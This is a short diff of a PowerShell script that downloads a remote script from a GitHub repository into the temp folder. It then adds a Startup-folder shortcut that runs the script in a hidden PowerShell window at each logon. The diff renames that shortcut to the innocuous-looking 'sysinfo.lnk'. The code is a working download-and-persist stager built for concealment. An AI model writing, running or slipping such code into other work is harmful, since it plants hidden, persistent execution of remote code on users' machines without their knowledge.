@@ -1,7 +1,7 @@
 wget https://raw.githubusercontent.com/EPiC-Inc/My-Collection/31c4b7a5fb498f9cff2c62712d7b5fb440e7792c/benign/superfun.ps1 -o $env:temp/a.ps1
 
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\REDACT.lnk")
+$Shortcut = $WshShell.CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sysinfo.lnk")
 $Shortcut.TargetPath = "powershell.exe"
 $Shortcut.Arguments = "-windowstyle hidden $env:temp/a.ps1"
 $Shortcut.Save()
